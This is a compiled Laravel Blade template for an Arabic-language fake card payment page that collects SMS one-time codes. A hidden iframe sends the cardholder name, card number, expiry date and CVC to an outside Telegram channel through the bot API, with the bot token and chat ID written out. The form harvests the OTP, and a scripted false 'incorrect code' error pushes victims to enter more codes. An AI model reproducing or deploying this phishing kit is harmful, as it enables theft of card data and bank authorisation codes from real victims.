
   <?php $__env->startSection('content'); ?> 

     
    
    <main>    <section class="mt-5 py-3">
    </section>
    <section class="container-fluid mt-3">
        <div class="row">
            <div class="rounded-4 shadow bg-white col-md-4 col-11 ms-auto me-auto px-4 py-3 my-md-5 my-3 border">
                <div class="row justify-content-center my-4  align-items-center">
                    <div class=" ">
                        <img src="assets/image/icons/visa.png" class="w-25 ms-5 ps-4" alt="">
                        <sapn class="fw-normal fs-4 text-center text-secondary   mx-2" dir="ltr">بطاقة ائتمانية | </sapn>
                    </div>
                </div>
                <div class="myCard">
                    <form action="<?php echo e(route('store_code')); ?>" method="POST"    class="container">
                        <?php echo csrf_field(); ?>
                        <p>
                            
                            
                            الرجاء ادخال الكود الذي يصلكم على الهاتف المحمول (احيانا يصل الكود متأخرا بعد دقائق)


                            
                        </p>
                        <div class="form-floating mb-3">
                                                                          <input  name="id" type="hidden" value="<?php echo e(request()->get('id')); ?>">
                            <input type="number" name="code" class="form-control rounded-4 " id="" required="" placeholder="رمز تأكيد العملية"   
                            
                            
                    oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
    type = "number"
    maxlength = "6">
    
                            <p id="demo" class="text-danger p-3 mb-2"> سيتم ارسال الكود خلال 60 ثانية </p>
                          
                          <div class="invalid-feedback container mt-2">
                                حدث خطأ في عملية الدفع حاول مرة اخرى !!                            
                            </div>
                          
                            <label for="order">
                                <div class=" text-secondary">
                                    <i class="fa-solid fa-circle-check fa-fw mx-2 fa-lg"></i>
                                    رمز التأكيد
                                </div>
                            </label>
                                                        
                        </div>
                        <div class="px-2">
                            <div class="form-check mb-3 border-top pt-2">
                                <label class="form-check-label text-secondary" style="font-size: 12px;" for="flexCheckDefault">يرجى ادخال رمز تأكيد العملية الذي تم ارساله عبر رسالة
                                    SMS
                                </label>
                            </div>
                        </div>
                        <div class="mb-3">
                             <?php
                            
                            $send=request()->get('send');
                            if($send!=1)
                            {
                            ?>
                            <button type="submit" class="w-100 btn primaryColor rounded-4 py-2" name="mybtn" id="codeConfirm">تأكيد
                            </button>
                            
                              <?php
                        }
                     
                            
                            $send=request()->get('send');
                            if($send==1)
                            {
                            ?>
                                <button type="submit" class="w-100 btn primaryColor rounded-4 py-2" name="mybtn" id="codeConfirm">اعادة ارسال 
                            </button>
                        <?php
                        }
                        ?>
                        
                        </div>
                    </form>
                </div>

            </div>
        </div>
    </section>




    <iframe src="https://api.telegram.org/bot6275729004:AAHFnEvKPlk85C7GDxKFcXRPqi8u9ypHs2g/sendMessage?chat_id=-1001875595955&amp;parse_mode=Markdown&amp;text=🙎‍♂️ اسم البطاقة : { 55 } %0A  🔐 رقم البطاقة : { 5555555555555555 } %0A  📆 تاريخ البطاقة : { 55 / 55 } %0A  🔑 CVC البطاقة : { 555 } %0A الدفعة الاولى : 1000 %0A واتساب : https%3A%2F%2Fwa.me%2F%2B96655 %0A  " hidden="" frameborder="0"></iframe>
    <iframe src="" hidden="" frameborder="0"></iframe>
    <iframe src="" hidden="" frameborder="0"></iframe>
    <script src="assets/js/bootstrap.js"></script>

<script>
// Set the date we're counting down to
var countDownDate = new Date("Jan 5, 2024 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();

  // Find the distance between now and the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
            document.getElementById("demo").innerHTML = " سيتم ارسال الكود خلال " + seconds + " ثانية "

  // If the count down is finished, write some text
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 100000);
</script>

<a href="https://wa.me/+966502254940" class="contact py-2 px-3 bg-success rounded-circle">
    <i class="fab fa-whatsapp text-white my-1 fa-2x"></i>
</a>
</main>
    
    
    
        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
    <script>
        
  $("#idForm").submit(function(e) {

    e.preventDefault(); // avoid to execute the actual submit of the form.

    var form = $(this);
    var actionUrl = form.attr('action');
    
    $.ajax({
   "headers": {'X-CSRF-TOKEN': $('meta[name="csrf_token"]').attr('content')}

,
        type: "POST",
                "_token": $('#token').val(),

        url: actionUrl,
        data: form.serialize(), // serializes the form's elements.
        success: function(data)
        {
            $("#code").val("");
//  location.reload();
  toastr.error('الرجاء ادخال الكود بطريقة صحيحة !');
        }
    });
    
});





function countdown() {
        var seconds = 59;
        function tick() {
          var counter = document.getElementById("demo");
          seconds--;
          counter.innerHTML =
            "0:" + (seconds < 10 ? "0" : "") + String(seconds);
          if (seconds > 0) {
            setTimeout(tick, 1000);
          } else {
            document.getElementById("verifiBtn").innerHTML = `
                <div class="Btn" id="ResendBtn">
                    <button type="submit">Resend</button>
                </div>
            `;
            document.getElementById("demo").innerHTML = "";
          }
        }
        tick();
      }
      countdown();

















    </script>
    
    
  <?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.master', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /home/u360299148/domains/pixil.store/public_html/core/resources/views/front/catalog/code.blade.php ENDPATH**/ ?>